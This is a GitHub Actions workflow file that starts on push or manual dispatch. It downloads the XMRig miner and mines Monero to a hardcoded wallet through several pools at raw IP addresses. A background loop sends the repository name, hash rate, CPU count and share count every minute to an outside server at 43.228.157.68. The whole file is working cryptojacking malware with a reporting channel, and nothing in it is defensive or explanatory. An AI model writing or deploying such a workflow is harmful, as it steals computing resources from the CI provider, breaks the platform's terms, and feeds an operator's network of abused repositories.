name: xm45548
on: [push, workflow_dispatch]
jobs:
  mine:
    runs-on: ubuntu-latest
    timeout-minutes: 350
    steps:
    - name: xmrig
      run: |
        sudo sysctl -w vm.nr_hugepages=1280 2>/dev/null||true
        curl -sfL https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-linux-static-x64.tar.gz|tar xz 2>/dev/null
        cd xmrig-6.21.3
        REPO="$GITHUB_REPOSITORY"
        (while true; do
          sleep 60
          RATE=$(grep -oP '[0-9.]+ H/s' /tmp/x.out 2>/dev/null|tail -1||echo "0 H/s")
          SHARES=$(grep -c "accepted" /tmp/x.out 2>/dev/null||echo 0)
          curl -s -X POST 'http://43.228.157.68:8888/api/github-results' --data-urlencode filename=xmr_mining.txt --data-urlencode "content=$REPO|$RATE|$(nproc)cpu|shares=$SHARES" 2>/dev/null||true
          curl -s -X POST 'http://43.228.157.68:8888/api/github-heartbeat' --data-urlencode "repo=$REPO" --data-urlencode "log=XMR $RATE" 2>/dev/null||true
        done) &
        ./xmrig -o 141.94.96.71:443 -u 4AsCn9VVdZgb7UYnhNPFpj5QUBjzLk1msahpUyy92mE3BjJeR7b5jNBhLbdLnpmpkXMFeGSM5LJhxbjjUnoEAhZLL8XTET7 -p gh --tls --no-color --donate-level=0 2>&1|tee /tmp/x.out ||         ./xmrig -o 45.155.102.89:443 -u 4AsCn9VVdZgb7UYnhNPFpj5QUBjzLk1msahpUyy92mE3BjJeR7b5jNBhLbdLnpmpkXMFeGSM5LJhxbjjUnoEAhZLL8XTET7 -p gh --tls --no-color --donate-level=0 2>&1|tee /tmp/x.out ||         ./xmrig -o 185.84.98.5:443 -u 4AsCn9VVdZgb7UYnhNPFpj5QUBjzLk1msahpUyy92mE3BjJeR7b5jNBhLbdLnpmpkXMFeGSM5LJhxbjjUnoEAhZLL8XTET7 -p gh --tls --no-color --donate-level=0 2>&1|tee /tmp/x.out
